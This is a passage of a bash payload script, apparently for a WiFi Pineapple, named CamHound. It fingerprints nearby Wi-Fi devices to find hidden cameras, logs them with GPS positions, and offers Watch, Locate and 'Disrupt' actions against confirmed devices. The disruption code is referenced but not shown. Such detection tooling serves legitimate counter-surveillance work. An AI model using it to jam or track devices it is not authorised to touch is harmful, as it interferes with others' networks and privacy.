dedupe_known() {   # dedupe_known mac rank -> 0 when an earlier run (within DEDUPE_H) already had this device at this rank or higher
  local mac="$1" rank="$2" sr=0 c
  (( DEDUPE_H > 0 && DEDUPE_RUN == 1 && CLOCK_OK == 1 )) || return 1
  [ -n "${SEEN_LAST[$mac]}" ] || return 1
  (( EPOCHSECONDS - ${SEEN_LAST[$mac]} < DEDUPE_H * 3600 )) || return 1
  c=${SEEN_CONF[$mac]:-0}; if (( c >= 80 )); then sr=3; elif (( c >= 45 )); then sr=2; elif (( c >= 20 )); then sr=1; fi
  (( sr >= rank )) || return 1
  if [[ ${SEEN_RSSI[$mac]} =~ ^-?[0-9]+$ && ${RSSI_LAST[$mac]:-x} =~ ^-?[0-9]+$ ]] && (( ${RSSI_LAST[$mac]} - ${SEEN_RSSI[$mac]} >= 10 )); then return 1; fi
  return 0
}
upsert_rows() {   # upsert_rows mac... -> merge these rows into inventory.tsv (randomised client MACs are not stored)
  local m f="$LOOT_DIR/inventory.tsv"
  { for m in "$@"; do [ -n "${ROLE[$m]}" ] || continue; [ "${ROLE[$m]}" = cli ] && is_rand "$m" && continue; inv_row "$m"; done; } >/tmp/cs_rows.tmp
  [ -s /tmp/cs_rows.tmp ] || return 0
  [ -s "$f" ] || printf '%s\n' "$INV_HDR" >"$f"
  awk -F'|' 'NR==FNR { new[$4]=$0; next } /^#/ { print; next } { if ($4 in new) { print new[$4]; delete new[$4] } else print } END { for (k in new) print new[k] }' /tmp/cs_rows.tmp "$f" >"$f.new" 2>/dev/null && mv "$f.new" "$f"
  rm -f /tmp/cs_rows.tmp
  (( CYCLE % 5 == 0 )) && sync
  return 0
}
pick_list() {
  local title="$1" def="$2"; shift 2
  local -a items=("$@") page
  local start=0 n=${#items[@]} resp rc
  while :; do
    page=("${items[@]:$start:9}")
    (( start + 9 < n )) && page+=("More...")
    (( start > 0 )) && page+=("<- Prev")
    (( ${#page[@]} == 0 )) && { PICK=""; return 1; }
    resp=$(LIST_PICKER "$title" "${page[@]}" "${def:-${page[0]}}" 2>/dev/null); rc=$?
    (( rc != 0 )) && { PICK=""; return 1; }
    case "$resp" in
      "More...") start=$((start + 9)); def="" ;;
      "<- Prev") start=$((start - 9)); (( start < 0 )) && start=0; def="" ;;
      "") PICK=""; return 1 ;;
      *) PICK="$resp"; return 0 ;;
    esac
  done
}
PICK=""
preflight() {
  local i a
  mkdir -p "$LOOT_DIR" 2>/dev/null
  printf -v RUN_ID '%(%Y%m%d_%H%M%S)T' -1; RUN_T0=$EPOCHSECONDS
  if ! command -v _pineap >/dev/null 2>&1; then set_state FAIL; ERROR_DIALOG "CamHound: _pineap not found" 2>/dev/null; exit 0; fi
  if jq_works; then HAVE_JQ=1
  elif command -v jq >/dev/null 2>&1; then          # present but unusable: say so, do not go silent
    log warn "jq present but cannot run our programs: using the fallback parsers"
    ui_ok && LOG yellow "jq unusable: fallback parser"
  fi
  recon_verb_probe
  capture_ready && HAVE_TCPDUMP=1
  [ -r "$OUI_FILE" ] || OUI_FILE="$OUI_FILE_ALT"
  [ -r "$OUI_FILE" ] || LOG yellow "no oui.txt: vendor rows disabled, OUI rows only"
  for i in wlan0 wlan1 wlan1mon wlan0cli wlan0mon; do a=$(cat "/sys/class/net/$i/address" 2>/dev/null); [ -n "$a" ] && OWN_MACS+="${a,,} "; done
  a=$(uci -q get pineapd.wlan1mon.bands 2>/dev/null || uci -q get pineapd.wlan1.bands 2>/dev/null); a=${a//[![:alnum:],]/}
  [ -n "$a" ] && { BANDS_LINE="$a"; [[ $a != *6* ]] && BANDS_LINE+=" (6 GHz not scanned)"; }
  if [ -f "$INSTALL_DIR/cam_signatures.txt" ]; then load_signatures "$INSTALL_DIR/cam_signatures.txt"; SIG_SOURCE="file"; fi
  if (( SIG_COUNT < 10 )); then load_signatures <(builtin_signatures); SIG_SOURCE="built-in"; fi
  (( SIG_COUNT == 0 )) && { set_state FAIL; ERROR_DIALOG "CamHound: no signatures" 2>/dev/null; exit 0; }
  load_inventory
  inj_probe || LOG yellow "regulatory probe failed: injectable channels limited to the set that is safe in any domain"
}
BANDS_LINE=""; INSTALL_DIR=""
run_lock() {
  local pid
  pid=$(cat "$LOCK_FILE" 2>/dev/null)
  if [[ $pid =~ ^[0-9]+$ ]] && kill -0 "$pid" 2>/dev/null && grep -qa payload "/proc/$pid/cmdline" 2>/dev/null; then
    LOG red "CamHound already running (pid $pid)"; exit 0
  fi
  kill_children; pkill -f "^_pineap MONITOR" 2>/dev/null   # anchored: only a real MONITOR process
  printf '%s' "$$" >"$LOCK_FILE"; : >"$CHILD_FILE"
  trap cleanup EXIT INT TERM
  # watchdog: if the UI kills this process (SIGKILL), release children and the EXAMINE lock
  ( while kill -0 "$MAIN_PID" 2>/dev/null; do sleep 3; done
    while read -r p; do [ -n "$p" ] && kill -TERM "$p" 2>/dev/null; done <"$CHILD_FILE" 2>/dev/null
    _pineap EXAMINE CANCEL; PINEAPPLE_EXAMINE_RESET
    [ "$(cat "$LOCK_FILE" 2>/dev/null)" = "$MAIN_PID" ] && rm -f "$LOCK_FILE" "$CHILD_FILE"
    bands_watchdog_restore ) >/dev/null 2>&1 &
}
# A band write the dead run issued is undone by its own watchdog. Keyed on the record, not on the lock: the record
# (BANDS_STATE, "<bands> <pid>") names the run that wrote it, and only that run's watchdog replays it, whoever holds
# the lock now -- a Recon hook started since never replays (it has no bands code), a new user payload replays any
# record at its start (bands_recover) and then writes its own under its own pid, which is left alone here. The record
# is claimed by rename before it is acted on, so a replay racing this watchdog cannot act on it twice.
bands_watchdog_restore() {
  local b pid claim="$BANDS_STATE.$MAIN_PID"
  read -r b pid <"$BANDS_STATE" 2>/dev/null || return 0
  [ "$pid" = "$MAIN_PID" ] || return 0                               # another run's record: theirs to replay
  mv -f "$BANDS_STATE" "$claim" 2>/dev/null || return 0               # a new run's bands_recover claimed it first
  read -r b pid <"$claim" 2>/dev/null
  if [ "$pid" != "$MAIN_PID" ]; then mv -f "$claim" "$BANDS_STATE" 2>/dev/null; return 0; fi   # changed hands in between: give it back
  if [[ $b =~ ^[256](,[256])*$ ]]; then
    # shellcheck disable=SC2086   # the tokens are the argument list
    PINEAPPLE_SET_BANDS "$RECON_IF" ${b//,/ } >/dev/null 2>&1
    log bands "restored $b by the watchdog (run $MAIN_PID killed)"
  fi
  rm -f "$claim"
}
# --- camhound lib end ---

# ================================================================================== cycle ===
declare -A SCORED HINTED NOALERT PENDING_OFFER
declare -a AP_LINES CLI_LINES
BASELINE_NEXT=1; TOP_OFFER_DONE=0

# kit_eval: AP + client label consensus (resolved labels, not raw prefixes)
kit_eval() {
  local ap c vt vl n cons ok mod weak ssid
  for ap in "${!CLIENTS_OF[@]}"; do
    [ -n "${ROLE[$ap]}" ] || continue
    KITAP[$ap]=""; n=0; cons=""; ok=1; mod=1; weak=1
    for c in ${CLIENTS_OF[$ap]}; do
      is_rand "$c" && continue
      vendor_sig "$c"; vt="${VEND_TYPE[$c]}"; vl="${VEND_LABEL[$c]}"; n=$((n + 1))
      case "$vt" in
        OUI|VENDOR)    mod=0; weak=0; if [ -z "$cons" ]; then cons="$vl"; elif [ "$cons" != "$vl" ]; then ok=0; fi ;;
        VENDOR_WEAK)   mod=0; ok=0; if [ -z "$cons" ]; then cons="$vl"; elif [ "$cons" != "$vl" ]; then weak=0; fi ;;
        VENDOR_MODULE) ok=0; weak=0 ;;
        *)             ok=0; mod=0; weak=0 ;;
      esac
    done
    (( n < KIT_MIN_CLIENTS )) && continue
    vendor_sig "$ap"; ssid="${SSID_CLEAN[$ap]}"
    if (( ok )) && [ -n "$cons" ]; then
      if [ "${VEND_LABEL[$ap]}" = "$cons" ] || { [ "${VEND_TYPE[$ap]}" = NONE ] && { [ "${HIDDEN[$ap]}" = 1 ] || is_rand "$ap"; }; }; then
        KITAP[$ap]=1; for c in ${CLIENTS_OF[$ap]}; do is_rand "$c" || KITCL[$c]=1; done; continue
      fi
    fi
    if (( mod )) && { [ "${HIDDEN[$ap]}" = 1 ] || [ -z "$ssid" ] || [[ $ssid =~ [0-9A-Fa-f]{4}$ ]]; }; then KITAP[$ap]="?"; continue; fi
    if (( weak )) && [ -n "$cons" ] && [ "${VEND_LABEL[$ap]}" = "$cons" ]; then KITAP[$ap]="?"; fi
  done
}

# busy_eval: RATE >= BUSY_PPS for BUSY_CYCLES cycles AND top-3 by RATE among clients on the same band
busy_eval() {
  local mac b r; local -A t1 t2 t3
  for mac in "${SEEN_THIS_CYCLE[@]}"; do
    [ "${ROLE[$mac]}" = ap ] && continue; r="${RATE[$mac]}"; [ -z "$r" ] && continue; b="${BAND[$mac]:-?}"
    if (( r > ${t1[$b]:--1} )); then t3[$b]=${t2[$b]:--1}; t2[$b]=${t1[$b]:--1}; t1[$b]=$r
    elif (( r > ${t2[$b]:--1} )); then t3[$b]=${t2[$b]:--1}; t2[$b]=$r
    elif (( r > ${t3[$b]:--1} )); then t3[$b]=$r; fi
  done
  for mac in "${SEEN_THIS_CYCLE[@]}"; do
    [ "${ROLE[$mac]}" = ap ] && continue; r="${RATE[$mac]}"; b="${BAND[$mac]:-?}"
    if [ -n "$r" ] && (( r >= BUSY_PPS * 10 )) && (( r >= ${t3[$b]:-0} )); then BUSY_N[$mac]=$(( ${BUSY_N[$mac]:-0} + 1 )); else BUSY_N[$mac]=0; fi
    if (( ${BUSY_N[$mac]} >= BUSY_CYCLES )); then BUSY[$mac]=1; else BUSY[$mac]=""; fi
  done
}

# band_rank name -> sets RANK_V. A global for the same reason as band_of: both call sites are
# per-device-per-cycle and each $( ) was a fork (960 each, 1,920 per cycle, measured).
band_rank() { case "$1" in CONFIRMED) RANK_V=3 ;; LIKELY) RANK_V=2 ;; STREAM|POSSIBLE) RANK_V=1 ;; *) RANK_V=0 ;; esac; }

run_cycle() {
  local line mac pk ssid ch fr sig hid t ap probes k=0 top=0 u=0 bz=0 r prev now_rank
  SEEN_THIS_CYCLE=(); NEW_LIKELY=(); NEW_CONFIRMED=(); NEW_LANE=(); CLIENTS_OF=(); SCORED=(); KITCL=(); KITAP=(); NOALERT=(); RSSI_IMPROVED=()
  CYCLE=$((CYCLE + 1))
  mapfile -t AP_LINES < <(recon_lines APS)
  mapfile -t CLI_LINES < <(recon_lines CLIENTS)
  # One OUI table pass for the whole cycle, BEFORE the loops below: record_seen resolves the vendor
  # inside them, so a prefetch placed after them would resolve an empty set and save nothing.
  local -a pf=(); for line in "${AP_LINES[@]}" "${CLI_LINES[@]}"; do pf+=("${line%%|*}"); done
  (( ${#pf[@]} )) && vendor_prefetch "${pf[@]}"
  if (( ${#AP_LINES[@]} == 0 && ${#CLI_LINES[@]} == 0 )); then RECON_EMPTY=$((RECON_EMPTY + 1)); else RECON_EMPTY=0; fi
  for line in "${AP_LINES[@]}"; do
    IFS='|' read -r mac pk ssid ch fr sig hid t <<<"$line"
    mac=${mac,,}; [[ $mac =~ ^([0-9a-f]{2}:){5}[0-9a-f]{2}$ ]] || continue
    [[ $OWN_MACS == *" $mac "* ]] && continue
    record_seen "$mac" ap "$ssid" "$ch" "$fr" "$sig"
    HIDDEN[$mac]=0; { [ "$hid" = 1 ] || [ -z "${SSID_CLEAN[$mac]}" ]; } && HIDDEN[$mac]=1
  done
  for line in "${CLI_LINES[@]}"; do
    IFS='|' read -r mac ap pk sig probes fr t ch <<<"$line"
    mac=${mac,,}; [[ $mac =~ ^([0-9a-f]{2}:){5}[0-9a-f]{2}$ ]] || continue
    [[ $OWN_MACS == *" $mac "* ]] && continue
    ap=${ap,,}; case "$ap" in ""|-|00:00:00:00:00:00|ff:ff:ff:ff:ff:ff) ap="-" ;; esac
    [[ $ap =~ ^([0-9a-f]{2}:){5}[0-9a-f]{2}$ ]] || ap="-"
    # No firmware names a client's AP, so this is "-" on every row. An AP read off the air for this
    # client (assoc_lookup, or a membership capture) is re-applied here every cycle, or the
    # AP_OF assignment below would wipe it. An association the firmware does supply always wins.
    [ "$ap" = - ] && [ -n "${ASSOC_BSS[$mac]}" ] && ap="${ASSOC_BSS[$mac]}"
    [ "$fr" = 0 ] && [ "$ap" != "-" ] && fr=${FREQ[$ap]:-0}
    [ "$ch" = 0 ] && [ "$ap" != "-" ] && ch=${CH[$ap]:-0}
    # an AP Recon never listed has no CH of its own. ONLY for the AP that channel was recorded for: a
    # firmware-supplied AP must not inherit the channel of a different AP that was once heard off the air
    [ "$ch" = 0 ] && [ "$ap" != "-" ] && [ "$ap" = "${ASSOC_BSS[$mac]:-}" ] && ch=${ASSOC_CH[$mac]:-0}
    record_seen "$mac" cli "${SSID_CLEAN[$ap]}" "$ch" "$fr" "$sig"
    AP_OF[$mac]="$ap"; PROBES[$mac]="$probes"
    [[ $pk =~ ^[0-9]+$ ]] && rate_update "$mac" "$pk"
    [ "$ap" != "-" ] && CLIENTS_OF[$ap]+=" $mac"
  done
  kit_eval; busy_eval
  for mac in "${SEEN_THIS_CYCLE[@]}"; do
    [ -n "${SCORED[$mac]}" ] && continue; SCORED[$mac]=1
    score_device "$mac"; prox_of "$mac"
  done
  # kit clients inherit the AP band silently
  for mac in "${!KITCL[@]}"; do
    ap="${AP_OF[$mac]}"; [ -n "$ap" ] && [ "$ap" != "-" ] || continue
    if (( ${CONF[$ap]:-0} > ${CONF[$mac]:-0} )); then CONF[$mac]=${CONF[$ap]}; BANDNAME[$mac]=${BANDNAME[$ap]}; fi
    NOALERT[$mac]=1
  done
  # alert collection
  for mac in "${!SCORED[@]}"; do
    [ -n "${IGNORED[$mac]}" ] && continue
    rssi_gate_ok "$mac" || continue
    band_rank "${BANDNAME[$mac]}"; now_rank=$RANK_V; prev=${ALERTED_BAND[$mac]:-0}
    if (( now_rank >= 1 )) && [[ ${TAGS[$mac]} != *RAND* ]] && [ "${LANE[$mac]}" != STREAM ] && [ "${BANDNAME[$mac]}" != MODULE ] && [ "${FIRST_CYCLE[$mac]:-0}" = "$CYCLE" ]; then
      k=$((k + 1)); (( ${CONF[$mac]} > top )) && top=${CONF[$mac]}
    fi
    [ "${BANDNAME[$mac]}" = MODULE ] && [ "${ROLE[$mac]}" != ap ] && [[ ${TAGS[$mac]} != *RAND* ]] && u=$((u + 1))
    [ "${BUSY[$mac]}" = 1 ] && bz=$((bz + 1))
    if (( BASELINE_NEXT )); then (( now_rank > prev )) && ALERTED_BAND[$mac]=$now_rank; continue; fi
    [ -n "${NOALERT[$mac]}" ] && { (( now_rank > prev )) && ALERTED_BAND[$mac]=$now_rank; continue; }
    if (( prev == 0 && now_rank >= 1 )) && dedupe_known "$mac" "$now_rank"; then
      ALERTED_BAND[$mac]=$now_rank; PROX_ALERTED[$mac]="${PROX[$mac]}"; log dedupe "known $mac rank=$now_rank last=${SEEN_LAST[$mac]}"; continue
    fi
    if (( now_rank > prev )); then
      ALERTED_BAND[$mac]=$now_rank; ALERT_TS[$mac]=$EPOCHSECONDS
      case "${BANDNAME[$mac]}" in
        CONFIRMED) NEW_CONFIRMED+=("$mac") ;;
        LIKELY)    NEW_LIKELY+=("$mac") ;;
        STREAM)    NEW_LANE+=("$mac") ;;
      esac
    elif (( now_rank >= 2 )) && (( EPOCHSECONDS - ${ALERT_TS[$mac]:-0} >= COOLDOWN_SECS )) && [[ ${PROX[$mac]} == [NM] ]] && [ "${PROX_ALERTED[$mac]}" != "${PROX[$mac]}" ] && [[ ${PROX_ALERTED[$mac]:-F} == [F?] ]]; then
      ALERT_TS[$mac]=$EPOCHSECONDS
      [ "${BANDNAME[$mac]}" = CONFIRMED ] && NEW_CONFIRMED+=("$mac") || NEW_LIKELY+=("$mac")
    fi
    (( now_rank >= 2 )) && PROX_ALERTED[$mac]="${PROX[$mac]}"
    # one-time hints
    if [ -z "${HINTED[$mac]}" ] && [ "${BUSY[$mac]}" = 1 ]; then
      if [ "${BANDNAME[$mac]}" = LIKELY ]; then HINTED[$mac]=1; ui_ok && LOG yellow "busy + ${ID_LABEL[$mac]} ${mac:9}: Watch?"
      elif [ "${BANDNAME[$mac]}" = MODULE ] && [[ ${RSSI_LAST[$mac]:--99} =~ ^-?[0-9]+$ ]] && (( ${RSSI_LAST[$mac]:--99} >= MODULE_HINT_RSSI )); then
        HINTED[$mac]=1; ui_ok && LOG yellow "module ${mac//:/} strong+busy: Watch?"; fi
    fi
  done
  STAT_K=$k; STAT_TOP=$top; STAT_U=$u; STAT_B=$bz
  gps_tick; battery_tick
  upsert_inventory
  (( CYCLE % REPORT_EVERY == 0 )) && write_report quiet
  log cycle "c=$CYCLE aps=${#AP_LINES[@]} clients=${#CLI_LINES[@]} new=$k top=$top modules=$u busy=$bz"
}
declare -A PROX_ALERTED
STAT_K=0; STAT_TOP=0; STAT_U=0; STAT_B=0

# status + alert output for the cycle just computed (LOG blocks: one fork per colour)
emit_cycle() {
  local hhmm n=0 mac blk="" top_state=""
  printf -v hhmm '%(%H:%M)T' -1
  n=${#ROLE[@]}
  if (( STAT_K > 0 )); then LOG "$hhmm $n+$STAT_K T$STAT_TOP U$STAT_U B$STAT_B [$MODE]"; else LOG "$hhmm $n U$STAT_U B$STAT_B [$MODE]"; fi
  if (( BASELINE_NEXT )); then BASELINE_NEXT=0; LOG "baseline: $n devices, bands ${BANDS_LINE:-?}"; return 0; fi
  if (( ${#NEW_LIKELY[@]} )); then
    blk=""; for mac in "${NEW_LIKELY[@]}"; do blk+="${CONF[$mac]} ${ID_LABEL[$mac]:-${TAGS[$mac]%% *}} ${mac:9} ${PROX[$mac]}${RSSI_LAST[$mac]:-}"$'\n'; done
    LOG yellow "LIKELY:"$'\n'"${blk%$'\n'}"
    top_state=LIKELY_QUIET
    for mac in "${NEW_LIKELY[@]}"; do
      if [[ ${PROX[$mac]} != F ]] || [ "$ALERT_FAR" = 1 ]; then top_state=LIKELY; fi
      log alert "LIKELY $mac ${CONF[$mac]} ${TAGS[$mac]} prox=${PROX[$mac]}"
    done
  fi
  if (( ${#NEW_LANE[@]} )); then
    blk=""; for mac in "${NEW_LANE[@]}"; do blk+="${CONF[$mac]} ${BEH_VERDICT[$mac]:-STREAM} ${mac:9} ${PROX[$mac]}${RSSI_LAST[$mac]:-}"$'\n'; log alert "LANE $mac ${CONF[$mac]}"; done
    LOG yellow "no identity, streaming-like:"$'\n'"${blk%$'\n'}"
    [ -z "$top_state" ] && top_state=LANE
  fi
  if (( ${#NEW_CONFIRMED[@]} )); then
    blk=""; for mac in "${NEW_CONFIRMED[@]}"; do blk+="${CONF[$mac]} ${ID_LABEL[$mac]:-${TAGS[$mac]%% *}} ${mac:9} ${PROX[$mac]}${RSSI_LAST[$mac]:-}"$'\n'; log alert "CONFIRMED $mac ${CONF[$mac]} ${TAGS[$mac]} prox=${PROX[$mac]}"; done
    LOG red "CONFIRMED:"$'\n'"${blk%$'\n'}"
    top_state=CONFIRMED
  fi
  [ -n "$top_state" ] && set_state "$top_state"
  # queue dialogs for the scan loop (issued between cycles)
  for mac in "${NEW_CONFIRMED[@]}" "${NEW_LIKELY[@]}"; do [ -z "${OFFERED[$mac]}" ] && PENDING_OFFER[$mac]=1; done
  return 0
}

# offer_dialogs: AUTO_WATCH funnel, at most one dialog per cycle, once per MAC
offer_dialogs() {
  local mac best="" bconf=0 brssi=-200 txt
  if (( TOP_OFFER_DONE == 0 )) && (( CYCLE >= 1 )) && [ "$AUTO_WATCH" = 1 ]; then
    TOP_OFFER_DONE=1
    for mac in "${!CONF[@]}"; do
      [ -n "${IGNORED[$mac]}" ] && continue
      (( ${ID_PTS[$mac]:-0} >= 45 )) || continue
      [[ ${RSSI_LAST[$mac]:--200} =~ ^-?[0-9]+$ ]] && (( ${RSSI_LAST[$mac]} >= AUTO_WATCH_RSSI )) || continue
      auto_offer_ok "$mac" || continue
      if (( ${CONF[$mac]} > bconf )) || { (( ${CONF[$mac]} == bconf )) && (( ${RSSI_LAST[$mac]} > brssi )); }; then best=$mac; bconf=${CONF[$mac]}; brssi=${RSSI_LAST[$mac]}; fi
    done
    if [ -n "$best" ]; then
      txt="$(count_band CONFIRMED) CONFIRMED, $(count_band LIKELY) LIKELY. Watch top: ${ID_LABEL[$best]} ${best:9} ${RSSI_LAST[$best]}?"
      OFFERED[$best]=1
      if confirm "$txt"; then watch_menu "$best"; return 0; fi
    fi
  fi
  for mac in "${!PENDING_OFFER[@]}"; do
    unset "PENDING_OFFER[$mac]"
    [ -n "${OFFERED[$mac]}" ] && continue
    OFFERED[$mac]=1
    if [ "$AUTO_WATCH" = 1 ] && auto_offer_ok "$mac"; then
      if confirm "${BANDNAME[$mac]} ${ID_LABEL[$mac]} ${mac:9}: Watch now?"; then watch_menu "$mac"; fi
      return 0
    elif [ "$AUTO_LOCATE" = 1 ] && is_setup_ap "$mac" && (( ${CONF[$mac]} >= 45 )); then
      if confirm "${BANDNAME[$mac]} ${ID_LABEL[$mac]} ${mac:9} (setup AP): Locate?"; then locate_target "$mac"; fi
      return 0
    elif [ "${BANDNAME[$mac]}" = CONFIRMED ] && auto_respond_ok "$mac"; then
      # third rung: a CONFIRMED device the Watch and Locate rungs above did not take.  With AUTO_WATCH=1 that
      # is one that cannot be Watched (no tcpdump; an unassociated client fails resp_target and never gets
      # here); with AUTO_WATCH=0 it is EVERY newly CONFIRMED device, on identity evidence alone, and with
      # AUTO_LOCATE=0 a CONFIRMED setup AP too.  The dialog, the picker and RESPONSE_CONFIRM still gate the transmit.
      if confirm "${BANDNAME[$mac]} ${ID_LABEL[$mac]} ${mac:9}: Disrupt?"; then disrupt_menu "$mac"; fi
      return 0
    elif [ "${BANDNAME[$mac]}" = CONFIRMED ] && [ "$ALERT_DIALOG" = 1 ]; then
      ALERT "CONFIRMED ${ID_LABEL[$mac]}" "${mac} ${CONF[$mac]} ${TAGS[$mac]}" 2>/dev/null; return 0
    fi
  done
}
# watchable mac -> has a BSSID to lock on and tcpdump is present (the operator may Watch any such row)
# is_setup_ap mac -> AP whose SSID matched a strong (setup / direct-mode) SSID row: never auto-offered Watch

gps_tick() {
  local fix lat lon mac
  [ "$GPS" = 1 ] || return 0
  (( GPS_BAD >= 2 && CYCLE % 5 != 0 )) && return 0
  fix=$(timeout 3 GPS_GET 2>/dev/null); read -r lat lon _ <<<"$fix"
  if [[ $lat =~ ^-?[0-9]+\.[0-9]+$ && $lon =~ ^-?[0-9]+\.[0-9]+$ && $lat != 0.000000 && $lon != 0.000000 && $lat != 0 ]]; then
    GPS_BAD=0; GPS_LAST="$lat $lon"; [ -z "$GPS_FIRST" ] && GPS_FIRST="$lat $lon"
    for mac in "${!RSSI_IMPROVED[@]}"; do LAT[$mac]=$lat; LON[$mac]=$lon; done
  else GPS_BAD=$((GPS_BAD + 1)); fi
}
GPS_FIRST=""
battery_tick() {
  local b
  (( EPOCHSECONDS - BATT_TS < 60 )) && return 0
  BATT_TS=$EPOCHSECONDS
  command -v BATTERY_PERCENT >/dev/null 2>&1 || return 0
  b=$(timeout 3 BATTERY_PERCENT 2>/dev/null)
  if [[ $b =~ ^[0-9]+$ ]]; then BATT=$b; (( b < 15 )) && [ -z "$BATT_WARNED" ] && { BATT_WARNED=1; LOG yellow "battery ${b}%"; }; else BATT="?"; fi
}
BATT_WARNED=""

# inventory.tsv upsert: pending rows -> awk merge -> atomic mv (one fork per cycle)

# ===================================================================================== UI ===
declare -a ROW_TEXT ROW_MAC

# pick_list "title" "default" items...  -> PICK (empty on B / cancel); items paginated by 10 with More...

# row_for mac -> ROW (conf tags prox glyph rssi, cut to ROW_W, never a partial tag)
ROW=""
row_for() {
  local mac="$1" t tags="" budget glyph="A" r
  [ "${ROLE[$mac]}" = cli ] && glyph="c"
  # printf -v, not $( ): row_for runs once per listed row and each $( ) was a fork. Two per row.
  r="${RSSI_LAST[$mac]:-}"; [ -n "$r" ] && printf -v r '%d' "$r" 2>/dev/null
  budget=$((ROW_W - 7 - ${#r}))   # "A " + "NN " + tags + " " + prox + rssi
  for t in ${TAGS[$mac]}; do
    [ "$t" = BUSY ] && continue
    if (( ${#tags} + ${#t} + (${#tags} > 0 ? 1 : 0) <= budget )); then tags+="${tags:+ }$t"; fi
  done
  [ -z "$tags" ] && tags="${TAGS[$mac]%% *}"
  # Glyph FIRST. It used to sit between the proximity letter and the RSSI with no separators -
  # "NA-52" - which is unreadable, and it is the one field that decides whether Disrupt works at
  # all. Leading column, same place on every row, so the list can be scanned down.
  printf -v ROW '%s %2d %s %s%s' "$glyph" "$(( ${CONF[$mac]} > 99 ? 99 : ${CONF[$mac]} ))" "$tags" "${PROX[$mac]:-?}" "$r"
  [ "${BUSY[$mac]}" = 1 ] && ROW+=" busy"
  ROW=${ROW:0:$ROW_W}
}

# sort_macs KIND -> SORTED. One `sort` for the whole list, not an O(h^2) bash insertion sort, and
# band_rank sets a global rather than being called in $( ) once per row. The old comment here
# claimed "zero fork" and was wrong about exactly that call. LC_ALL=C so the byte order is the
# device's and does not shift with the host locale.
declare -a SORTED
sort_macs() {   # by band rank desc, then prox N>M>F>?, then conf desc
  local kind="$1" mac key; local -a keyed=()
  for mac in "${!CONF[@]}"; do
    [ -n "${IGNORED[$mac]}" ] && continue
    rssi_gate_ok "$mac" || continue
    prox_of "$mac"                                       # staleness: unseen > 90 s reads ? here, not its last bucket
    case "$kind" in
      hits)    (( ${CONF[$mac]} >= 20 )) || continue; [ "${BANDNAME[$mac]}" = MODULE ] && continue ;;
      modules) { [[ ${TAGS[$mac]} =~ (^| )MODULE( |$) ]] && (( ${CONF[$mac]} < 45 )); } || continue; [ "${ROLE[$mac]}" = ap ] && continue ;;
      # "other" is the COMPLEMENT of the two lists above, written as the negation of their own
      # predicates so it cannot drift out of step with them. It exists because the behaviour rung -
      # the whole point of which is devices no signature can name - was reachable only for module
      # CLIENTS: "hits" needs a score, and the modules list refuses APs by design (PLAN_v2 item 14
      # specifies it as client rows). So a camera running its own AP under an SSID the signature
      # file does not carry appeared in NO list and could not be Watched at all. Seven SSID rows
      # exist for exactly that device class, which is what makes the gap an asymmetry rather than a
      # deliberate omission. Gated on PROX, not raw RSSI, so FAR_DBM decides and prox_of's band
      # (-7 dB on 5/6 GHz) and role (-6 dB on a client) adjustments are already applied.
      # A device Watched into a STREAM verdict scores >= 20 and promotes itself into Review hits,
      # so this list drains as it is worked through rather than accumulating.
      other)   { (( ${CONF[$mac]} >= 20 )) && [ "${BANDNAME[$mac]}" != MODULE ]; } && continue
               { [[ ${TAGS[$mac]} =~ (^| )MODULE( |$) ]] && (( ${CONF[$mac]} < 45 )) && [ "${ROLE[$mac]}" != ap ]; } && continue
               case "${PROX[$mac]}" in N|M) ;; *) continue ;; esac ;;
    esac
    local p=3; case "${PROX[$mac]}" in N) p=0 ;; M) p=1 ;; F) p=2 ;; esac
    local kit=0; [ "${KITAP[$mac]}" = "?" ] && kit=1
    local bz=0; [ "${BUSY[$mac]}" = 1 ] && bz=1
    local rs=${RSSI_LAST[$mac]:--200}; [[ $rs =~ ^-?[0-9]+$ ]] || rs=-200
    case "$kind" in
      modules) printf -v key '%d%d%04d%03d' $((1 - kit)) $((1 - bz)) $((200 + rs > 0 ? 400 - (200 + rs) : 400)) $((999 - ${CONF[$mac]})) ;;
      other)   printf -v key '%d%04d' $((1 - bz)) $((200 + rs > 0 ? 400 - (200 + rs) : 400)) ;;   # busy first, then loudest
      *)       band_rank "${BANDNAME[$mac]}"; printf -v key '%d%d%03d' $((3 - RANK_V)) "$p" $((999 - ${CONF[$mac]})) ;;
    esac
    keyed+=("$key $mac")
  done
  SORTED=()
  (( ${#keyed[@]} )) || return 0
  local item
  while read -r item; do SORTED+=("${item#* }"); done < <(printf '%s\n' "${keyed[@]}" | LC_ALL=C sort)
}

review_list() {
  local mac last_band="" i; local -A rowseen=()
  while :; do
    sort_macs hits
    ROW_TEXT=("Resume scan"); ROW_MAC=("")
    last_band=""; rowseen=()
    for mac in "${SORTED[@]}"; do
      if [ "${BANDNAME[$mac]}" != "$last_band" ]; then last_band="${BANDNAME[$mac]}"; ROW_TEXT+=("-- $last_band --"); ROW_MAC+=(""); fi
      row_for "$mac"
      # O(1) against a seen-set. This was a rescan of every previous row, so the list build was
      # O(h^2) on top of sort_macs' own, and it is what made backing out of a card take seconds.
      [ -n "${rowseen[$ROW]}" ] && ROW="${ROW:0:$((ROW_W - 5))} ${mac:13}"
      rowseen[$ROW]=1
      ROW_TEXT+=("$ROW"); ROW_MAC+=("$mac")
    done
    ROW_TEXT+=("Exit"); ROW_MAC+=("")
    pick_list "[$MODE] Review hits (${#SORTED[@]})" "" "${ROW_TEXT[@]}" || return 0
    case "$PICK" in
      "Resume scan") return 0 ;;
      "Exit") return 1 ;;
      "-- "*) continue ;;
    esac
    for ((i = 0; i < ${#ROW_TEXT[@]}; i++)); do [ "${ROW_TEXT[i]}" = "$PICK" ] && { detail_card "${ROW_MAC[i]}"; break; }; done
  done
}

modules_list() {
  local mac i rows=0
  sort_macs modules
  ROW_TEXT=("not cameras until Watched"); ROW_MAC=("")
  for mac in "${SORTED[@]}"; do
    ROW=$(printf '%s %s %s%s' "${mac//:/}" "${VENDOR[$mac]:0:8}" "${PROX[$mac]:-?}" "${BUSY[$mac]:+ busy}")
    [ "${KITAP[${AP_OF[$mac]:--}]}" = "?" ] && ROW+=" KIT?"
    ROW_TEXT+=("${ROW:0:$ROW_W}"); ROW_MAC+=("$mac"); rows=$((rows + 1))
  done
  ROW_TEXT+=("Back"); ROW_MAC+=("")
  pick_list "[$MODE] Unidentified modules ($rows)" "" "${ROW_TEXT[@]}" || return 0
  case "$PICK" in "Back"|"not cameras until Watched") return 0 ;; esac
  for ((i = 0; i < ${#ROW_TEXT[@]}; i++)); do [ "${ROW_TEXT[i]}" = "$PICK" ] && { detail_card "${ROW_MAC[i]}" watch; break; }; done
}

